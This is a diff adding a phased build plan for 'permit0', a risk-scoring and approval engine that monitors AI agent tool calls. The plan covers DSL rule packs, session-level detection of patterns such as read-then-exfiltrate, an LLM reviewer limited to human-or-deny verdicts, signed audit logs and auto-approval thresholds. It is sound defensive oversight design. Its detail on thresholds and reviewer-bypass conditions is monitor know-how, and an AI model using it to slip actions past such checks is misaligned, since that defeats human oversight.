+**Crates:** `permit0-normalize` (new logic in existing stub)
+
+**Tasks:**
+1. `Normalizer` trait: `id()`, `priority()`, `matches()`, `normalize()`
+2. `NormalizeCtx` struct: org-provided context values (`org_domain`, `org_stripe_account_id`, etc.)
+3. `NormalizerRegistry`:
+   - Register normalizers sorted by priority (highest first)
+   - Conflict detection: two normalizers at same priority that both match same input → registration-time error
+   - `normalize()`: iterate by priority, return first match
+   - Fallback normalizer (priority 0) for unknown tools
+4. `NormAction` builder with `norm_hash()` computation
+5. `NormalizeError` enum: `NoMatch`, `MissingRequiredField`, `TypeCastFailed`, `HelperFailed`
+
+**Tests:**
+- Mock normalizers: highest priority wins
+- Conflict detection: same-priority overlap → error
+- Fallback: unmatched tool → fallback normalizer
+- `norm_hash` stability: same `NormAction` → same hash across runs
+
+**Exit criteria:**
+- `NormalizerRegistry` dispatches correctly with priority ordering
+- `norm_hash` is deterministic and stable
+
+**Dependencies:** Phase 1 (needs `NormAction`, `RawToolCall` types).
+
+---
+
+### Phase 3 — DSL Runtime & First Packs
+
+**Goal:** YAML packs load and execute. First real normalizers and risk rules work end-to-end.
+
+**Crate:** `permit0-dsl`
+
+**Tasks:**
+
+**3a — DSL Parser:**
+1. YAML schema validation for normalizer files (match, normalize, entities)
+2. YAML schema validation for risk rule files (base, rules, session_rules)
+3. Pack manifest parser (`pack.yaml`)
+4. `extends` resolution for version-aware normalizers
+5. `api_version.range` parser and comparator
+6. Static validation (all checks from dsl.md §10):
+   - Known primitives, valid flag names, amplifier ranges 0–30
+   - All 10 amplifier dimensions present in base
+   - `compute` references known helpers
+   - No `required` + `default` conflict
+
+**3b — DSL Interpreter:**
+1. `DslNormalizer` — implements `Normalizer` trait, driven by parsed YAML
+2. Match expression evaluator: `all`, `any`, `not`, condition primitives
+   - `matches_url` with host/path matching
+   - String predicates: `contains`, `starts_with`, `ends_with`, `regex`
+   - Numeric comparisons: `gt`, `gte`, `lt`, `lte`
+   - Collection predicates: `in`, `not_in`, `exists`, `not_empty`, `any_match`
+3. Normalize executor: entity extraction with `from`, `type`, `default`, `lowercase`, `compute`
+4. Risk rule executor:
+   - Build `RiskTemplate` from `base`
+   - Evaluate `rules` top-to-bottom with mutation actions
+   - `gate` halts evaluation
+   - `split` creates child template
+5. `DslRiskRule` — implements a `RiskRule` trait, driven by parsed YAML
+
+**3c — Closed Helper Registry:**
+1. Implement all 13 helpers from dsl.md §9:
+   - `classify_destination`, `recipient_scope`, `count_pipes`
+   - `extract_domain`, `is_private_ip`, `parse_path_depth`
+   - `classify_file_type`, `extract_amount_cents`, `detect_pii_patterns`
+   - `url_host`, `url_path`, `string_length`, `list_length`
+2. Helper dispatch: name → function pointer
+3. Argument resolution: field paths and literals
+
+**3d — First Packs:**
+1. `packs/bash/` — shell command normalizer + `process.shell` risk rules
+2. `packs/gmail/` — email send/forward normalizer + `email.send` risk rules
+3. `packs/stripe/` — charges, refunds, transfers normalizers + `payments.charge/refund/transfer` risk rules
+4. Fixtures for each pack (normalizer + risk rule fixtures)
+5. Golden test: §9 worked example runs end-to-end (normalize → score → tier=MEDIUM)
+
+**Tests:**
+- Static validation: malformed YAML → clear error messages
+- Match expression: all condition primitives tested
+- Normalize: entity extraction with all field properties
+- Risk rules: mutation actions, gate, split
+- `norm_hash` golden test: YAML normalizer produces same hash as expected
+- Pack fixtures: `permit0 pack test packs/**` passes
+
+**Exit criteria:**
+- `permit0 pack test` passes for bash, gmail, and stripe packs
+- §9 worked example reproduces `tier=MEDIUM, score=38` from YAML packs
+- Static checker catches all invalid YAML patterns from dsl.md §10
+
+**Dependencies:** Phase 2 (needs `Normalizer` trait, `NormalizerRegistry`).
+
+---
+
+### Phase 4 — Permission Pipeline
+
+**Goal:** `Engine::get_permission()` — the full decision pipeline from raw tool call to permission.
+
+**Crate:** `permit0-engine`
+
+**Tasks:**
+1. `Engine` struct holding normalizer registry, risk rules, scoring config, in-memory store
+2. `EngineBuilder`:
+   - `with_base_config()`, `with_profile()`, `with_org_policy()`
+   - `install_pack()` — load YAML pack directory
+   - `install_native()` — register Rust-native normalizer
+   - `build()` — validate guardrails, resolve layers, construct engine
+3. `get_permission()` pipeline (§10):
+   - Step 1: Normalize via registry
+   - Step 2: Denylist check (norm_hash)
+   - Step 3: Allowlist check (norm_hash)
+   - Step 4: Policy cache check
+   - Step 5: Unknown action type → placeholder (Phase 13 will implement bootstrap)
+   - Step 6: Risk scoring via YAML risk rules
+   - Step 7: Score → routing (Allow / Human / Deny / Agent)
+   - Step 8: Stub `handle_medium()` → returns HUMAN (Phase 10 will implement reviewer)
+4. In-memory store: `HashMap`-based denylist, allowlist, policy cache
+5. `PermissionCtx` struct: normalize context + session (optional) + task goal
+6. Policy cache: auto-populate on scoring, invalidate on config change
+
+**Tests:**
+- Integration tests covering the full §10 decision-mapping table:
+  - Denylist hit → Deny
+  - Allowlist hit → Allow
+  - Cache hit → cached decision
+  - LOW score → Allow
+  - MEDIUM score → Human (stub)
+  - HIGH score → Human
+  - CRITICAL / gate → Deny
+- `EngineBuilder` rejects invalid guardrail configurations
+- Profile + org policy layer composition
+
+**Exit criteria:**
+- `get_permission()` returns correct decisions for all tier/list combinations
+- §10 decision-mapping table 100% covered by integration tests
+
+**Dependencies:** Phase 3 (needs DSL runtime, packs, scoring).
+
+---
+
+### Phase 5 — Persistence
+
+**Goal:** Decisions survive restarts. SQLite as default store.
+
+**Crate:** `permit0-store`
+
+**Tasks:**
+1. `Store` trait:
+   - `denylist_check()`, `denylist_add()`, `denylist_remove()`
+   - `allowlist_check()`, `allowlist_add()`, `allowlist_remove()`
+   - `policy_cache_get()`, `policy_cache_set()`, `policy_cache_clear()`
+   - `save_decision()`, `query_decisions()`
+2. `SqliteStore` implementation:
+   - Schema: `denylist`, `allowlist`, `policy_cache`, `decisions` tables
+   - Migrations via `rusqlite` (embedded, no external tool)
+   - WAL mode for concurrent reads
+3. `InMemoryStore` — kept for testing and development
+4. Wire `SqliteStore` into `EngineBuilder::with_store()`
+5. Cache invalidation on profile/policy change
+
+**Tests:**
+- Restart survival: populate cache → drop engine → rebuild → cache hit
+- CRUD operations for all list types
+- Concurrent read/write under WAL mode
+
+**Exit criteria:**
+- Cache hits short-circuit scoring across engine restarts
+- `SqliteStore` passes all `Store` trait tests
+
+**Dependencies:** Phase 4 (needs `Engine` to wire store into).
+
+---
+
+### Phase 6 — Capability Tokens
+
+**Goal:** Approved actions issue a Biscuit token verifiable offline.
+
+**Crate:** `permit0-token`
+
+**Tasks:**
+1. `Token` trait: `mint()`, `verify()`, `attenuate()`
+2. `BiscuitTokenProvider` implementation:
+   - Mint: embed claims (action_type, scope, risk_score, tier, session_id, safeguards, nonce, expiry)
+   - Verify: signature + expiry + scope constraints
+   - Attenuate: narrow scope, shorten TTL (biscuit native)
+3. Root keypair management:
+   - Generate: `permit0 token keygen`
+   - Load from file or `PERMIT0_TOKEN_KEY` env var
+4. TTL by issuing authority: scorer=5min, human=1hr
+5. Safeguards per tier (§11): `log_entities`, `log_body`, `confirm_before_execute`
+6. Scope verification: actual entities must match token constraints
+
+**Tests:**
+- Mint → verify round-trip
+- Expired token → rejected
+- Tampered token → rejected
+- Attenuated token: narrower scope passes, broader fails
+- Scope violation: amount exceeds ceiling → rejected
+
+**Exit criteria:**
+- `get_permission()` returns valid token on Allow
+- Tampered/expired/scope-violated tokens correctly rejected
+
+**Dependencies:** Phase 4 (needs `Engine` to wire tokens into pipeline).
+
+---
+
+### Phase 7 — CLI & Calibration Harness
+
+**Goal:** Developer-facing CLI for scoring, pack testing, and calibration.
+
+**Crate:** `permit0-cli`
+
+**Tasks:**
+1. `permit0 check < tool_call.json` — score a single tool call, print decision + breakdown
+2. `permit0 check --interactive` — REPL mode for rapid testing
+3. `permit0 pack new <id>` — scaffold new normalizer + risk rule + fixtures
+4. `permit0 pack test <path>` — run normalizer and risk rule fixtures
+5. `permit0 pack validate <path>` — static validation without running fixtures
+6. `permit0 pack diff old.yaml new.yaml` — show norm_hash impact of changes
+7. `permit0 calibrate diff --profile fintech` — show what a profile changes from base
+8. `permit0 calibrate simulate --profile fintech --input '...'` — score with specific config
+9. `permit0 calibrate test --corpus corpora/calibration/` — run golden corpus
+10. `permit0 calibrate validate --profile fintech --org-policy ./config.yaml` — guardrail check
+11. Domain profiles: `profiles/fintech.profile.yaml`, `profiles/healthtech.profile.yaml`
+12. Golden calibration corpus: 50+ (NormAction, expected_tier) cases across domains
+
+**Tests:**
+- CLI integration tests: verify output format and exit codes
+- Calibration corpus: all cases pass with expected tiers
+- Profile diff: known profile → known output
+
+**Exit criteria:**
+- `permit0 pack test packs/**` passes in CI
+- `permit0 calibrate test --corpus corpora/calibration/` passes
+- CI fails on tier drift (calibration regression test)
+
+**Dependencies:** Phase 5 (needs persistence for cache), Phase 6 (needs tokens for full output).
+
+---
+
+### Phase 8 — Python Bindings
+
+**Goal:** `pip install permit0` — Python developers can use the engine.
+
+**Crate:** `permit0-py`
+
+**Tasks:**
+1. PyO3 bindings for: `Engine`, `EngineBuilder`, `Permission`, `RiskScore`, `Tier`, `NormAction`
+2. Pythonic API: `Engine.from_config(profile=..., packs=[...])` convenience constructor
+3. `engine.get_permission(tool_call={...}, session_id=..., ...)` → `(Permission, Optional[Token])`
+4. `engine.verify_token(token, entities)` → `VerificationResult`
+5. External normalizer bridge: `@engine.register_normalizer()` decorator
+6. Error handling: Rust errors → Python exceptions with clear messages
+7. Build: `maturin` + `cibuildwheel` for Linux/macOS/Windows wheels
+8. Mirror Phase 4 integration tests in pytest
+
+**Exit criteria:**
+- `pip install permit0` works (prebuilt wheel, no Rust toolchain needed)
+- Python test suite mirrors Rust integration tests and passes
+
+**Dependencies:** Phase 7 (needs full engine with CLI for testing).
+
+---
+
+### Phase 9 — TypeScript Bindings
+
+**Goal:** `npm install @permit0/core` — TypeScript developers can use the engine.
+
+**Crate:** `permit0-node`
+
+**Tasks:**
+1. napi-rs bindings for: `Engine`, `Permission`, `RiskScore`, `Tier`, `NormAction`
+2. TypeScript API: `Engine.fromConfig({...})`, `engine.getPermission({...})`
+3. Full TypeScript type definitions (`.d.ts`)
+4. External normalizer bridge via callback registration
+5. Build: `@napi-rs/cli` with prebuilt binaries per platform
+6. Mirror Phase 4 integration tests in vitest
+
+**Exit criteria:**
+- `npm install @permit0/core` works (prebuilt binary, no Rust toolchain needed)
+- TypeScript test suite mirrors Rust integration tests and passes
+
+**Dependencies:** Phase 7 (needs full engine with CLI for testing).
+
+---
+
+### Phase 10 — Session-Aware Scoring
+
+**Goal:** Risk decisions incorporate session history — cumulative amounts, temporal patterns, attack chains.
+
+**Crate:** `permit0-session`
+
+**Tasks:**
+
+**10a — SessionContext & Basic Operations:**
+1. `SessionContext` struct with `session_id` and `Vec<ActionRecord>`
+2. `ActionRecord`: action_type, tier, flags, timestamp, entities
+3. `SessionFilter` struct for scoping queries
+4. Basic operations: `recent()`, `count()`, `max_tier()`, `flag_sequence()`, `rate_per_minute()`, `preceded_by()`
+
+**10b — Numeric Aggregation:**
+1. `sum()` — cumulative sum of entity field (e.g. total transfer amount)
+2. `max_val()` — maximum entity field value
+3. `min_val()` — minimum entity field value (micro-transaction detection)
+4. `avg()` — average entity field value
+5. All support `SessionFilter` with `within_minutes`, `action_type`, `action_types`
+
+**10c — Advanced Counting:**
+1. `count_where()` — count records matching entity conditions
+2. `distinct_count()` — count unique entity field values (e.g. distinct recipients)
+3. `distinct_values()` — collect unique values
+
+**10d — Temporal Patterns:**
+1. `duration_minutes()` — session duration
+2. `idle_then_burst()` — silence then sudden activity
+3. `accelerating()` — increasing action frequency over sliding windows
+4. `rate_per_minute_windowed()` — rate within time window
+
+**10e — Set & Sequence Operations:**
+1. `sequence()` — ordered/unordered action type subsequence detection
+2. `distinct_flags()` — distinct risk flags in time window
+3. `ratio()` — count ratio between two filtered groups
+
+**10f — DSL Integration:**
+1. Extend `permit0-dsl` interpreter to evaluate `session_rules` section
+2. Parse all session condition primitives from dsl.md §5
+3. Session conditions compose with `all`/`any`
+4. Session amplifier auto-derivation: `session_amplifier_score()`
+
+**10g — Session Block Rules:**
+1. Implement built-in session block rules (privilege_escalation_then_exec, read_then_exfiltrate, bulk_external_send, cumulative_transfer_limit, card_testing, scatter_transfer)
+2. Evaluate in `compute_hybrid` step 2b, after per-call block rules
+3. Custom session block rules via YAML `session_rules` with `gate`
+
+**10h — Session Storage:**
+1. In-memory `HashMap<SessionId, SessionContext>` for development
+2. Wire session into `Engine::get_permission()` — auto-record each decision
+3. Session lifetime management: clear on task completion
+
+**Tests:**
+- Cumulative amount escalation: §12 worked example (transfers $50k → $150k → $550k)
+- Card testing detection: §12 worked example (3 micro-charges to distinct customers)
+- Read-then-exfiltrate: §12 worked example
+- Attack chain sequence detection
+- Idle-then-burst pattern
+- Accelerating frequency detection
+- Ratio-based reconnaissance detection
+- Session amplifier derivation monotonicity
+- All session primitives tested with boundary values
+
+**Exit criteria:**
+- §12 all three worked examples reproduce expected tiers
+- Cumulative transfer threshold correctly blocks at $500k
+- Session block rules fire on known dangerous patterns
+- YAML `session_rules` with `session.sum`, `session.distinct_count`, etc. evaluate correctly
+
+**Dependencies:** Phase 4 (needs `Engine` to wire session into).
+
+---
+
+### Phase 11 — Agent-in-the-Loop Reviewer
+
+**Goal:** MEDIUM-tier calls are reviewed by an LLM agent. Output is HUMAN or DENY only.
+
+**Crate:** `permit0-agent`
+
+**Tasks:**
+1. `LlmClient` trait: `review(prompt: &str) -> Result<String, LlmError>`
+2. Feature-gated implementations: `ollama`, `openai`, `mock`
+3. `handle_medium()` implementation:
+   - `should_skip()`: always-human types, score >= 52, session has blocked action → direct HUMAN
+   - Context assembly: norm_action, risk_score, raw_tool_call, task_goal, session, similar_past, org_policy
+   - LLM prompt construction with hard constraints (§13)
+   - Response parsing → `AgentReviewResponse` (verdict, reason, confidence)
+   - Confidence gate: deny requires >= 0.90; below → HUMAN
+   - Parse failure → HUMAN
+4. `ReviewVerdict` enum: `HumanInTheLoop`, `Deny` (no Allow, no token issuance)
+5. Wire into `Engine`: replace stub `handle_medium`
+
+**Tests:**
+- Mock LLM: known prompt → known verdict
+- Confidence below 0.90: deny → downgraded to HUMAN
+- Parse failure: → HUMAN
+- Always-human types: bypass reviewer entirely
+- Score >= 52: bypass reviewer
+- Verify: reviewer never produces Allow or issues tokens
+
+**Exit criteria:**
+- MEDIUM calls route through reviewer with correct HUMAN/DENY output
+- Allow-bias impossible by construction (no Allow variant in ReviewVerdict)
+
+**Dependencies:** Phase 10 (needs session context for reviewer input).
+
+---
+
+### Phase 12 — Audit & Compliance
+
+**Goal:** Cryptographically signed, tamper-evident audit log with compliance-grade export.
+
+**Crates:** `permit0-store` (extend), `permit0-cli` (extend)
+
+**Tasks:**
+
+**12a — Audit Core:**
+1. `AuditEntry` struct with all fields from §15
+2. Hash chain: `prev_hash = SHA-256(previous entry)`, sequence monotonic
+3. ed25519 signature over `entry_hash`
+4. `ScoringDetail` for independent reproducibility
+5. `Redactor` trait + built-in patterns (password, secret, token, api_key, Bearer, sk_live_, etc.)
+6. Domain-specific redaction patterns configurable per org
+
+**12b — Audit Sink:**
+1. `AuditSink` trait: `append()`, `append_batch()`, `query()`, `verify_chain()`
+2. `SqliteAuditSink` — default, WAL mode
+3. `PostgresAuditSink` — production
+4. `S3AuditSink` — WORM archival
+5. `StdoutAuditSink` — pipe to SIEM (Splunk, Datadog, Elastic)
+6. `audit_policy: strict` — block decisions if sink fails (required for fintech)
+7. `audit_policy: best_effort` — log failure, buffer, retry
+
+**12c — Export & Verification:**
+1. CSV export: `permit0 audit export --format csv`
+2. JSONL export: `permit0 audit export --format jsonl`
+3. Signed bundle export: self-contained archive (manifest, entries, chain, pubkey, signature)
+4. `permit0 audit verify <bundle>` — verify on air-gapped machine
+5. Online verification: `permit0 audit verify --store postgres --range ...`
+
+**12d — Query & Lifecycle:**
+1. `permit0 audit query` with filters (action-type, decision, tier, time range, session)
+2. `permit0 audit stats` — aggregate metrics (by domain, overrides, time)
+3. `permit0 audit archive --older-than 365d --to s3://...`
+4. GDPR pseudonymization: `ActorRef` with pseudonym + identity store reference
+5. `permit0 audit gdpr-forget --actor-ref ...` — remove identity mapping, keep audit entry
+
+**Tests:**
+- Hash chain integrity: tamper one entry → verification fails
+- Signature verification: valid/invalid/tampered
+- Strict mode: sink failure → decision blocked
+- Export round-trip: export → verify → all entries valid
+- Redaction: sensitive patterns removed before signing
+- Retention compliance: entries queryable within retention window
+
+**Exit criteria:**
+- Signed audit bundle verifiable on air-gapped machine
+- `audit_policy: strict` blocks decisions when sink is down
+- Hash chain detects any tampering
+- GDPR forget removes identity without breaking audit chain
+
+**Dependencies:** Phase 5 (needs `Store` trait), Phase 10 (needs session data in audit entries).
+
+---
+
+### Phase 13 — Learning System
+
+**Goal:** Human decisions become training data. Repeatedly-approved patterns auto-promote.
+
+**Crates:** `permit0-engine` (extend), `permit0-store` (extend)
+
+**Tasks:**
+1. `DecisionRecord` storage: every `get_permission()` call → persisted record
+2. Human override capture: original decision vs human decision
+3. `TrainingFeatures` extraction from decision records
+4. Policy cache promotion: human approve → cache hit on next identical norm_hash
+5. Allowlist suggestion: >= 50 approvals with < 2% override rate → suggest promotion
+6. `should_auto_approve()` check: 100+ examples, < 5% override, no recent incidents
+7. Automation escalation phases: all-MEDIUM-to-human → well-understood-auto → edge-cases-only
+
+**Tests:**
+- Cache promotion: human approve → next identical call → cache hit (skip scoring)
+- Allowlist suggestion threshold: 50 approvals + low override rate → flagged
+- Override tracking: human overrides correctly recorded and queryable
+
+**Exit criteria:**
+- Approved HUMAN decision becomes cache hit on next identical norm_hash
+- Allowlist suggestion fires when thresholds met
+
+**Dependencies:** Phase 11 (needs human review flow), Phase 12 (needs audit storage).
+
+---
+
+### Phase 14 — Bootstrap Unknown Actions
+
+**Goal:** When the engine sees an action type it has no risk rule for, it bootstraps new rules with human oversight.
+
+**Crate:** `permit0-engine` (extend)
+
+**Tasks:**
+1. Unknown action type detection: `!self.has_risk_rule(&norm.action_type)`
+2. `create_new_rules()`: LLM proposes normalizer + risk rules in YAML
+3. Human gate: proposed rules are never auto-applied. Displayed for review.
+4. `score_from_rules()`: once approved, deterministic scoring via DSL interpreter
+5. CLI: `permit0 bootstrap <tool_call.json>` — interactive rule creation workflow
+
+**Tests:**
+- Unknown tool call → bootstrap pipeline invoked
+- Proposed rules are syntactically valid YAML
+- No auto-application without human approval
+
+**Exit criteria:**
+- Unseen tool walks full bootstrap pipeline
+- Human must approve before rules take effect
+
+**Dependencies:** Phase 11 (needs LLM client).
+
+---
+
+### Phase 15a — Approval UI (Local Token)
+
+**Goal:** Web dashboard for audit log viewing and human approval workflow.
+
+**Crate:** `permit0-ui`
+
+**Tasks:**
+
+**Backend (axum):**
+1. REST API endpoints (§15 API Endpoints):
+   - `/api/v1/audit` — list, detail, stats
+   - `/api/v1/approvals` — list pending, submit decision
+   - `/api/v1/lists/*` — allowlist/denylist CRUD
+   - `/api/v1/sessions` — active sessions
+2. WebSocket endpoint (`/ws`):
+   - `approval_pending` push on new HUMAN-routed decision
+   - `approval_resolved` push when another reviewer decides
+   - `audit_entry` push for live log streaming
+   - Client subscribe/unsubscribe to channels
+3. `PendingApproval` with `oneshot::Sender<HumanDecision>`:
+   - `get_permission()` creates pending, awaits response
+   - Timeout (default 5 min) → Deny
+   - Fallback when UI not connected: CLI prompt or auto-deny (configurable)
+4. Local token auth:
+   - `permit0 ui token create --role admin --name "Alice"` → `sk-p0-xxx`
+   - Token verification middleware
+   - Roles: viewer, approver, admin
+5. `permit0 ui serve --port 8080` command
+6. `permit0 ui approve --interactive` CLI fallback
+
+**Frontend (React + TailwindCSS):**
+1. Audit Log page: paginated table with filters (time, action_type, tier, decision, source, agent, session, pack), expandable rows with full scoring detail
+2. Approval Queue page: real-time WebSocket feed, approve/deny buttons, detail panel with risk breakdown and session timeline
+3. Lists Management page: allowlist/denylist CRUD with search
+4. Dashboard page: decision distribution chart, tier distribution, override rate, approval latency, top action types
+5. Login page: token entry
+6. Responsive layout, dark/light theme
+7. Embed as static assets via `rust-embed`
+
+**Tests:**
+- API integration tests: all endpoints return correct data
+- WebSocket: pending approval → push → resolve → push
+- Timeout: pending approval expires → Deny
+- Auth: invalid token → 401, viewer cannot approve
+- Frontend: build succeeds, assets embedded
+
+**Exit criteria:**
+- `permit0 ui serve` starts, dashboard loads in browser
+- Approve/deny from browser unblocks waiting agent within 1 second
+- Audit log filters and pagination work
+- WebSocket real-time updates visible
+
+**Dependencies:** Phase 12 (needs audit data), Phase 11 (needs human review flow).
+
+---
+
+### Phase 15b — OIDC Auth
+
+**Goal:** Enterprise SSO login for the approval UI.
+
+**Crate:** `permit0-ui` (extend)
+
+**Tasks:**
+1. OIDC client: authorization code flow with PKCE
+2. Provider integration: Okta, Azure AD, Google Workspace (generic OIDC discovery)
+3. Role mapping: OIDC claims/groups → permit0 roles (viewer/approver/admin)
+4. Session management: HTTP-only cookies, refresh token rotation
+5. Configuration:
+   ```yaml
+   auth:
+     mode: oidc
+     issuer: https://login.acme.com
+     client_id: permit0-ui
+     client_secret_env: PERMIT0_OIDC_SECRET
+     allowed_domains: ["acme.com"]
+     role_mapping:
+       admin: ["security-team@acme.com"]
+   ```
+
+**Tests:**
+- Mock OIDC provider: full login flow
+- Role mapping: correct roles assigned from claims
+- Token refresh: expired access token → refresh → continue
+
+**Exit criteria:**
+- Enterprise SSO login works with standard OIDC provider
+- Role-based access enforced (viewer cannot approve)
+
+**Dependencies:** Phase 15a (needs base UI).
+
+---
+
+### Phase 16 — Host Adapters & Community
+
+**Goal:** Real-world integrations and open-source community infrastructure.
+
+**Tasks:**
+
+**Adapters:**
+1. Claude Code hook adapter: `permit0` as a PreToolUse hook
+2. Generic stdin/stdout JSON gateway: pipe tool calls, receive decisions
+3. HTTP server mode: `permit0 serve --port 9090` — REST API for remote agents
+4. OpenTelemetry tracing: spans for normalize, score, review, approve
+
+**Community:**
+1. Pack contribution guide: step-by-step tutorial with template
+2. PR template for new packs
+3. CODEOWNERS for `packs/` directory
+4. Pack staging pipeline: `community/` → `verified/` after review + CI
+5. `permit0 pack new` generates complete scaffold with fixture stubs
+6. Online playground: WASM build for browser-based pack testing
+
+**Tests:**
+- Claude Code hook: end-to-end with mock tool call
+- JSON gateway: pipe in → decision out
+- HTTP server: REST call → decision response
+
+**Exit criteria:**
+- Real agent traffic flows through permit0
+- Community contributor can submit a pack PR following the guide
+
+**Dependencies:** Phase 15a (needs full system for integration testing).
+
+---
+
+### Dependency Graph
+
+```
+Phase 0 ─── Phase 1 ─── Phase 2 ─── Phase 3 ─── Phase 4
+                                                    │
+                                          ┌─────────┼─────────┐
+                                          ▼         ▼         ▼
+                                       Phase 5   Phase 6   Phase 10
+                                          │         │         │
+                                          └────┬────┘         │
+                                               ▼              │
+                                            Phase 7           │
+                                            │    │            │
+                                     ┌──────┘    └──────┐     │
+                                     ▼                  ▼     │
+                                  Phase 8            Phase 9  │
+                                                              ▼
+                                                          Phase 11
+                                                              │
+                                                    ┌─────────┤
+                                                    ▼         ▼
+                                                Phase 12   Phase 13
+                                                    │         │
+                                                    ▼         ▼
+                                                Phase 14   Phase 15a
+                                                              │
+                                                              ▼
+                                                          Phase 15b
+                                                              │
+                                                              ▼
+                                                          Phase 16
+```
+
+### Critical Path
+
+**Shortest useful slice:** **0 → 1 → 2 → 3 → 4 → 7**
+
+This gives you a Rust core with YAML-defined packs, deterministic scoring, persistence, and a calibration harness — the foundation everything else builds on. A developer can `permit0 check < tool_call.json` and get a scored decision.
+
+**First production slice:** add **5 → 6 → 10 → 12 → 15a**
+
+This adds persistence, tokens, session awareness, audit compliance, and a web UI for human approvals — enough to run in a real fintech environment with SOC 2 audit requirements.
+
+### Parallelization Opportunities
+
+| Can run in parallel | Reason |
+|---|---|
+| Phase 5, 6, 10 | All depend on Phase 4 but not on each other |
+| Phase 8, 9 | Both depend on Phase 7 but not on each other |
+| Phase 13, 14 | Both depend on Phase 11 but not on each other |
